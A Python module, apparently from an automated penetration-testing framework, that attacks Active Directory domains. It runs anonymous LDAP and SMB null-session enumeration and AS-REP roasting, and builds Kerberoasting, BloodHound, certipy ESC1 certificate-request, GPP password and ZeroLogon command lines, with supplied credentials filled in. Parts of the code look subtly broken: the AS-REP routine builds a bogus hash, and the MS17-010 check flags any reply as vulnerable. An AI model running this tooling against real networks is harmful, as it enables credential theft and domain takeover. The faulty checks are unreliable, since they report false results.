import base64
import socket
from typing import Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("domain_hunt")

HAVE_IMPACKET = False
HAVE_LDAP3 = False
try:
    from impacket.smbconnection import SMBConnection
    HAVE_IMPACKET = True
except Exception:
    pass

try:
    import ldap3
    HAVE_LDAP3 = True
except Exception:
    pass

ASREP_ENCRYPTION_TYPES = {23: "rc4", 17: "aes128", 18: "aes256"}


def enum_dc(domain: str, dc_ip: Optional[str] = None) -> Dict:
    result = {"domain": domain, "dc_ip": dc_ip, "ldap": {}, "smb": {}, "dns": {}}
    from tools.kali_executor import run_kali_cmd
    if dc_ip:
        dns_r = run_kali_cmd("nslookup -type=SRV _ldap._tcp.dc._msdcs.%s %s" % (domain, dc_ip))
    else:
        dns_r = run_kali_cmd("nslookup -type=SRV _ldap._tcp.dc._msdcs.%s" % domain)
    if dns_r.get("success"):
        result["dns"]["ldap_srv"] = dns_r.get("stdout", "")[:500]
    else:
        try:
            result["dns"]["ldap_srv"] = socket.getaddrinfo(domain, 389)
        except Exception as e:
            result["dns"]["error"] = str(e)
    if HAVE_LDAP3 and dc_ip:
        try:
            s = ldap3.Server(dc_ip, get_info=ldap3.ALL, port=389)
            c = ldap3.Connection(s, receive_timeout=10)
            if c.bind():
                result["ldap"]["server_info"] = str(s.info)[:500]
                result["ldap"]["naming_contexts"] = [str(x) for x in s.info.naming_contexts]
                result["ldap"]["domain_dn"] = s.info.other.get("defaultNamingContext", [""])[0]
                c.unbind()
        except Exception as e:
            result["ldap"]["error"] = str(e)
    return result


def ldap_anonymous_enum(dc_ip: str, base_dn: Optional[str] = None) -> Dict:
    result = {"success": False, "entries": [], "error": None}
    if not HAVE_LDAP3:
        result["error"] = "ldap3 not available"
        return result
    try:
        s = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
        c = ldap3.Connection(s, receive_timeout=10)
        if not c.bind():
            result["error"] = "bind failed"
            return result
        if not base_dn:
            base_dn = str(s.info.other.get("defaultNamingContext", [""])[0])
            if not base_dn:
                result["error"] = "no base DN"
                return result
        result["base_dn"] = base_dn
        search_filter = "(|(objectClass=user)(objectClass=computer)(objectClass=group))"
        try:
            c.search(base_dn, search_filter, attributes=['sAMAccountName', 'objectClass',
                     'userAccountControl', 'description', 'memberOf', 'servicePrincipalName'],
                     size_limit=100, time_limit=15)
            for entry in c.entries:
                e = {"dn": str(entry.entry_dn)}
                for attr in entry.entry_attributes:
                    val = entry[attr].value if hasattr(entry[attr], 'value') else str(entry[attr])
                    if isinstance(val, (list, tuple)):
                        val = [str(v) for v in val[:5]]
                    e[attr] = str(val)[:200]
                result["entries"].append(e)
            result["success"] = True
        except Exception as e:
            result["error"] = "search: %s" % str(e)
        c.unbind()
    except Exception as e:
        result["error"] = str(e)
    return result


def asrep_roast(dc_ip: str, domain: str, usernames: List[str]) -> Dict:
    result = {"success": False, "asrep_users": [], "hashes": []}
    if not HAVE_IMPACKET:
        result["error"] = "impacket required for AS-REP roasting"
        return result
    try:
        _asrep_impl(result, dc_ip, domain, usernames)
    except Exception as e:
        result["error"] = str(e)
    return result


def _asrep_impl(result, dc_ip, domain, usernames):
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import KerberosError, sendKerberos
    from impacket.krb5.types import PrincipalName

    for username in usernames:
        try:
            principal_name = PrincipalName(constants.PrincipalNameType.NT_PRINCIPAL.value, username)
            tgt, cipher, key, old_session_key = sendKerberos(
                None, None, None, None,
                None, None, None,
                None, None, domain, dc_ip,
                username, None,
                None, None,
                useCache=False,
            )
            result["asrep_users"].append({
                "username": username,
                "hash": "%s:$krb5asrep$%s@%s:%s" % (
                    username, "23",
                    domain.upper(),
                    base64.b64encode(key.contents).decode() if hasattr(key, 'contents') else str(key),
                ),
            })
            result["success"] = True
        except KerberosError as e:
            if e.getErrorCode() != 0x12:
                continue
        except Exception:
            continue


def kerberoast(dc_ip: str, domain: str, username: str, password: str) -> Dict:
    result = {"success": False, "tgs_hashes": []}
    if not HAVE_LDAP3:
        result["error"] = "ldap3 required for SPN enumeration"
        result["commands"] = [
            "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (dc_ip, domain, username, password),
        ]
        return result
    try:
        spn_filter = '(servicePrincipalName=*/*)'
        s = ldap3.Server(dc_ip, port=389)
        c = ldap3.Connection(s, user="%s\\%s" % (domain, username), password=password,
                             receive_timeout=10, authentication=ldap3.NTLM)
        if c.bind():
            c.search(str(s.info.other.get("defaultNamingContext", [""])[0]),
                    spn_filter,
                    attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf'],
                    size_limit=100, time_limit=15)
            for entry in c.entries:
                spns = entry.servicePrincipalName.values if hasattr(entry.servicePrincipalName, 'values') else []
                sam = str(entry.sAMAccountName.value) if hasattr(entry.sAMAccountName, 'value') else ""
                for spn in spns[:5]:
                    if isinstance(spn, bytes):
                        spn = spn.decode('utf-8', errors='replace')
                    result["tgs_hashes"].append({
                        "user": sam,
                        "spn": spn,
                        "hash_cmd": "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (dc_ip, domain, username, password),
                    })
            c.unbind()
            result["success"] = True
    except Exception as e:
        result["error"] = str(e)
    return result


def smb_enum(target_ip: str, username: Optional[str] = None,
              password: Optional[str] = None, domain: str = ".") -> Dict:
    result = {"success": False, "signing": False, "shares": [], "null_session": False, "os_info": ""}
    if not HAVE_IMPACKET:
        result["error"] = "impacket required"
        return result
    try:
        conn = SMBConnection(target_ip, target_ip)
        result["signing"] = conn.isSigningRequired()
        if not username or not password:
            try:
                conn.login("", "")
                result["null_session"] = True
                for share in conn.listShares():
                    result["shares"].append(str(share))
                conn.logoff()
            except Exception:
                pass
        else:
            try:
                if domain != ".":
                    conn.login(username, password, domain=domain)
                else:
                    conn.login(username, password)
                for share in conn.listShares():
                    result["shares"].append(str(share))
                conn.logoff()
            except Exception as e:
                result["error"] = str(e)
        result["success"] = True
    except Exception as e:
        result["error"] = str(e)
    return result


def bloodhound_collect(dc_ip: str, domain: str, username: str, password: str) -> Dict:
    result = {"success": False, "method": "bloodhound-python", "commands": []}
    cmd = "bloodhound-python -d %s -u %s -p '%s' -dc %s -c All -ns %s" % (
        domain, username, password, dc_ip, dc_ip
    )
    result["commands"].append(cmd)
    result["output_file"] = "%s_bloodhound.zip" % domain
    result["success"] = True
    result["note"] = "Run command, then load ZIP into BloodHound"
    return result


def adcs_scan(target_ip: str, domain: str) -> Dict:
    result = {"success": False, "cert_servers": [], "vulnerable_templates": []}
    from tools.kali_executor import run_kali_cmd
    r = run_kali_cmd("python3 /usr/share/ldap-scripts/adcs_enum.py -s %s -d %s 2>/dev/null || certipy find -dc-ip %s -target %s 2>/dev/null || echo 'no_adcs_tool'" % (target_ip, domain, target_ip, target_ip))
    stdout = r.get("stdout", "") or ""
    if "Certificate Authorities" in stdout or "CA Name" in stdout:
        result["success"] = True
        result["raw_output"] = stdout[:2000]
    else:
        result["note"] = "ADCS scanning requires certipy or ldap-scripts"
        result["commands"] = [
            "certipy find -dc-ip %s -u USER@%s -p PASS" % (target_ip, domain),
            "certipy req -dc-ip %s -ca CA-NAME -template ESC1-TEMPLATE -u USER@%s -p PASS" % (target_ip, domain),
        ]
    return result


def check_gpp_password(target_ip: str, username: Optional[str] = None,
                        password: Optional[str] = None) -> Dict:
    result = {"success": False, "passwords": []}
    if not HAVE_IMPACKET:
        result["note"] = "impacket required for GPP check"
        result["commands"] = [
            "impacket-Get-GPPPassword -dc-ip %s %s/%s:%s" % (target_ip, "DOMAIN", username or "USER", password or "PASS"),
            "empire module: powershell/collection/Get-GPPPassword",
        ]
        return result
    try:
        result["note"] = "GPP check requires SYSVOL access; try Get-GPPPassword.py manually"
        result["commands"] = [
            "impacket-Get-GPPPassword -dc-ip %s %s/%s:%s" % (target_ip, "DOMAIN", username or "USER", password or "PASS"),
        ]
    except Exception as e:
        result["error"] = str(e)
    return result


def check_ms17_010(target_ip: str) -> Dict:
    result = {"vulnerable": False, "port_open": False}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 445))
        result["port_open"] = True
        s.send(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        s.recv(1024)
        s.send(b"\x00\x00\x00\x00" + b"\xff\x53\x4d\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        resp = s.recv(1024)
        if resp and len(resp) > 8:
            result["vulnerable"] = True
        s.close()
    except Exception as e:
        result["error"] = str(e)
    return result


def check_zerologon(target_ip: str) -> Dict:
    result = {"vulnerable": False, "checked": False}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 445))
        s.close()
        result["note"] = "ZeroLogon requires netlogon RPC; try manual check with zerologon.py"
        result["commands"] = [
            "zerologon-scan %s" % target_ip,
            "python3 CVE-2020-1472.py %s %s" % (target_ip, "DC_NAME"),
            "crackmapexec smb %s -u '' -p '' -d DOMAIN -M zerologon" % target_ip,
        ]
        result["checked"] = True
    except Exception:
        result["error"] = "Cannot connect to DC"
    return result


def enum_mssql(target_ip: str, username: Optional[str] = None,
               password: Optional[str] = None) -> Dict:
    result = {"port_open": False, "accessible": False, "info": {}}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, 1433))
        result["port_open"] = True
        s.close()
        result["note"] = "MSSQL port 1433 open - try connecting with known credentials"
        result["commands"] = [
            "impacket-mssqlclient %s/%s:%s@%s" % (username or "DOMAIN", "USER", "PASS", target_ip),
            "sqsh -S %s -U %s -P %s" % (target_ip, username or "sa", password or "PASS"),
        ]
    except Exception:
        pass
    return result


def domain_audit_summary(domain: str, dc_ip: str, username: Optional[str] = None,
                          password: Optional[str] = None, usernames: Optional[List[str]] = None) -> Dict:
    result = {
        "domain": domain,
        "dc_ip": dc_ip,
        "ldap": {},
        "kerberos": {},
        "smb": {},
        "adcs": {},
        "recommendations": [],
    }

    dc_info = enum_dc(domain, dc_ip)
    result["dc_info"] = dc_info

    if dc_ip:
        anon = ldap_anonymous_enum(dc_ip)
        result["ldap"]["anonymous"] = anon
        if anon.get("success") and len(anon.get("entries", [])) > 0:
            result["recommendations"].append("CRITICAL: LDAP anonymous bind enabled - enumerate all users/objects")

        smb = smb_enum(dc_ip)
        result["smb"] = smb
        if smb.get("null_session"):
            result["recommendations"].append("CRITICAL: SMB null session allowed")
        if not smb.get("signing"):
            result["recommendations"].append("HIGH: SMB signing not required - relay attacks possible")

    if usernames and dc_ip and domain:
        asrep = asrep_roast(dc_ip, domain, usernames)
        result["kerberos"]["asrep_roast"] = asrep
        if asrep.get("success") and asrep.get("asrep_users"):
            result["recommendations"].append("HIGH: %d AS-REP roastable users found" % len(asrep["asrep_users"]))

    if dc_ip and domain:
        gpp = check_gpp_password(dc_ip, username, password)
        result["gpp"] = gpp
        if gpp.get("success"):
            result["recommendations"].append("CRITICAL: GPP passwords found - domain admin access likely")

        ms17 = check_ms17_010(dc_ip)
        result["ms17_010"] = ms17
        if ms17.get("vulnerable"):
            result["recommendations"].append("CRITICAL: MS17-010 (EternalBlue) vulnerable - RCE on DC")

        zerologon = check_zerologon(dc_ip)
        result["zerologon"] = zerologon
        if zerologon.get("vulnerable"):
            result["recommendations"].append("CRITICAL: ZeroLogon (CVE-2020-1472) vulnerable - DC takeover")

        mssql = enum_mssql(dc_ip, username, password)
        result["mssql"] = mssql

    if username and password and dc_ip and domain:
        kerb = kerberoast(dc_ip, domain, username, password)
        result["kerberos"]["kerberoast"] = kerb
        if kerb.get("success") and kerb.get("tgs_hashes"):
            result["recommendations"].append("MEDIUM: %d kerberoastable SPNs found" % len(kerb["tgs_hashes"]))

        bh = bloodhound_collect(dc_ip, domain, username, password)
        result["bloodhound"] = bh

        adcs = adcs_scan(dc_ip, domain)
        result["adcs"] = adcs
        if adcs.get("success"):
            result["recommendations"].append("HIGH: AD CS vulnerabilities may exist - check certipy output")

    result["success"] = True
    return result


def run(target: str, dc_ip: Optional[str] = None,
         domain: Optional[str] = None,
         username: Optional[str] = None,
         password: Optional[str] = None,
         userlist: Optional[List[str]] = None) -> Dict:
    if not domain and target:
        domain = target
    if not dc_ip and target:
        try:
            dc_ip = socket.gethostbyname(target)
        except Exception:
            pass
    return domain_audit_summary(
        domain=domain or target,
        dc_ip=dc_ip,
        username=username,
        password=password,
        usernames=userlist,
    )
